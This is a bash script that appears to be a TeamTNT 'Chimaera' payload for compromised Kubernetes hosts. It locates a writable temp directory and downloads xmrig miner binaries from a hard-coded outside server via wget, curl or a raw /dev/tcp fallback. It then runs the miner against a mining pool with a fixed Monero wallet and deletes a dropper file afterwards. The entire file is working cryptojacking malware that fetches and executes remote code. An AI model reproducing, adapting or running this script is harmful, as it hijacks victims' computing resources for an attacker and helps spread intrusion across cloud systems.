#!/bin/bash
#
#	TITLE:		Chimaera_Kubernetes_temp_PayLoad_2
#	AUTOR:		hilde@teamtnt.red
#	VERSION:	Chimaera_stable_V1.00.1
#	DATE:		12.08.2021
#
#	SRC:        http://chimaera.cc/cmd/Kubernetes_temp_PayLoad_2.sh
#   CNF_SRC:	http://chimaera.cc/dat/config.json
#
########################################################################

# xmrigDaemon --cc-disabled --donate-level=1 --cpu-max-cpu-usage=100 --threads=$(nproc) --keepalive --tls --url=94.130.12.27:443 --user=84hYzyMkfn8RAb5yMq7v7QfcZ3zgBhsGxYjMKcZU8E43ZDDwDAdKY5t84TMZqfPVW84Dq58AhP3AbUNoxznhvxEaV23f57T --pass=$(cat /etc/hostname)

if [ "$(uname -m)" = "aarch64" ]; then C_hg_SYS="aarch64"
elif [ "$(uname -m)" = "x86_64" ];  then C_hg_SYS="x86_64"
elif [ "$(uname -m)" = "i386" ];    then C_hg_SYS="i386"
else C_hg_SYS="i386"; fi

XMR_1_BIN_URL="http://85.214.149.236:443/sugarcrm/themes/default/images/SugarLogic/.../xmr/kuben3/$C_hg_SYS.xmrigDaemon"
XMR_1_BIN_NAME="xmrigDaemon"
XMR_2_BIN_URL="http://85.214.149.236:443/sugarcrm/themes/default/images/SugarLogic/.../xmr/kuben3/$C_hg_SYS.xmrigMiner"
XMR_2_BIN_NAME="xmrigMiner"
XMR_CONFG_URL="http://85.214.149.236:443/sugarcrm/themes/default/images/SugarLogic/.../xmr/kuben3/config.json"
XMR_PARAMETER="--cc-disabled --donate-level=1 --cpu-max-cpu-usage=100 --threads=$(nproc) --keepalive --tls --url=94.130.12.27:443 --user=84hYzyMkfn8RAb5yMq7v7QfcZ3zgBhsGxYjMKcZU8E43ZDDwDAdKY5t84TMZqfPVW84Dq58AhP3AbUNoxznhvxEaV23f57T --pass=$(cat /etc/hostname) --background"

function C_hg_DLOAD() {
  read proto server path <<< "${1//"/"/ }"
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  while IFS= read -r line ; do 
      [[ "$line" == $'\r' ]] && break
  done <&3
  nul='\0'
  while IFS= read -d '' -r x || { nul=""; [ -n "$x" ]; }; do 
      printf "%s$nul" "$x"
  done <&3
  exec 3>&-
}

function C_hg_DLOAD_BASH(){
C_hg_T_PATH=$1
	if [ -z "$C_hg_T_PATH" ]; then 
	C_hg_DLOAD $XMR_1_BIN_URL > $XMR_1_BIN_NAME
	C_hg_DLOAD $XMR_2_BIN_URL > $XMR_2_BIN_NAME
	#C_hg_DLOAD $XMR_CONFG_URL > config.json
	chmod +x $XMR_1_BIN_NAME $XMR_2_BIN_NAME
	chmod +x ./$XMR_1_BIN_NAME ./$XMR_2_BIN_NAME
	./$XMR_1_BIN_NAME $XMR_PARAMETER
		else
		C_hg_DLOAD $XMR_1_BIN_URL > $C_hg_T_PATH/$XMR_1_BIN_NAME
		C_hg_DLOAD $XMR_2_BIN_URL > $C_hg_T_PATH/$XMR_2_BIN_NAME
		#C_hg_DLOAD $XMR_CONFG_URL > $C_hg_T_PATH/config.json
		chmod +x $C_hg_T_PATH/$XMR_1_BIN_NAME $C_hg_T_PATH/$XMR_2_BIN_NAME
		cd $C_hg_T_PATH/
		$C_hg_T_PATH/$XMR_1_BIN_NAME $XMR_PARAMETER
		fi
}

function C_hg_DLOAD_CURL(){
C_hg_T_PATH=$1
	if [ -z "$C_hg_T_PATH" ]; then 
	curl $XMR_1_BIN_URL -o $XMR_1_BIN_NAME
	curl $XMR_2_BIN_URL -o $XMR_2_BIN_NAME
	#curl $XMR_CONFG_URL -o config.json
	chmod +x $XMR_1_BIN_NAME $XMR_2_BIN_NAME
	chmod +x ./$XMR_1_BIN_NAME ./$XMR_2_BIN_NAME
	./$XMR_1_BIN_NAME $XMR_PARAMETER
		else
		curl $XMR_1_BIN_URL -o $C_hg_T_PATH/$XMR_1_BIN_NAME
		curl $XMR_2_BIN_URL -o $C_hg_T_PATH/$XMR_2_BIN_NAME
		#curl $XMR_CONFG_URL -o $C_hg_T_PATH/config.json
		chmod +x $C_hg_T_PATH/$XMR_1_BIN_NAME $C_hg_T_PATH/$XMR_2_BIN_NAME
		cd $C_hg_T_PATH/
		$C_hg_T_PATH/$XMR_1_BIN_NAME $XMR_PARAMETER
		fi
}

function C_hg_DLOAD_WGET(){
C_hg_T_PATH=$1
	if [ -z "$C_hg_T_PATH" ]; then 
	wget $XMR_1_BIN_URL -O $XMR_1_BIN_NAME
	wget $XMR_2_BIN_URL -O $XMR_2_BIN_NAME
	#wget $XMR_CONFG_URL -O config.json
	chmod +x $XMR_1_BIN_NAME $XMR_2_BIN_NAME
	chmod +x ./$XMR_1_BIN_NAME ./$XMR_2_BIN_NAME
	./$XMR_1_BIN_NAME $XMR_PARAMETER
		else
		wget $XMR_1_BIN_URL -O $C_hg_T_PATH/$XMR_1_BIN_NAME
		wget $XMR_2_BIN_URL -O $C_hg_T_PATH/$XMR_2_BIN_NAME
		#wget $XMR_CONFG_URL -O $C_hg_T_PATH/config.json
		chmod +x $C_hg_T_PATH/$XMR_1_BIN_NAME $C_hg_T_PATH/$XMR_2_BIN_NAME
		cd $C_hg_T_PATH/
		$C_hg_T_PATH/$XMR_1_BIN_NAME $XMR_PARAMETER
		fi
}

if [ -z "$C_hg_TMP_PATH" ]; then touch /var/tmp/K.t.2 2>/dev/null
if [ -f "/var/tmp/K.t.2" ]; then rm -f /var/tmp/K.t.2 2>/dev/null 1>/dev/null
C_hg_TMP_PATH="/var/tmp"
fi ; fi
	if [ -z "$C_hg_TMP_PATH" ]; then touch /tmp/K.t.2 2>/dev/null
	if [ -f "/tmp/K.t.2" ]; then rm -f /tmp/K.t.2 2>/dev/null 1>/dev/null
	C_hg_TMP_PATH="/tmp"
	fi ; fi
		if [ -z "$C_hg_TMP_PATH" ]; then touch /dev/shm/K.t.2 2>/dev/null
		if [ -f "/dev/shm/K.t.2" ]; then rm -f /dev/shm/K.t.2 2>/dev/null 1>/dev/null
		C_hg_TMP_PATH="/dev/shm"
		fi ; fi

  if type wget 2>/dev/null 1>/dev/null; then C_hg_DLOAD_WGET $C_hg_TMP_PATH
elif type curl 2>/dev/null 1>/dev/null; then C_hg_DLOAD_CURL $C_hg_TMP_PATH
elif type bash 2>/dev/null 1>/dev/null; then C_hg_DLOAD_BASH $C_hg_TMP_PATH
fi

rm -f k32t.sh 2>/dev/null
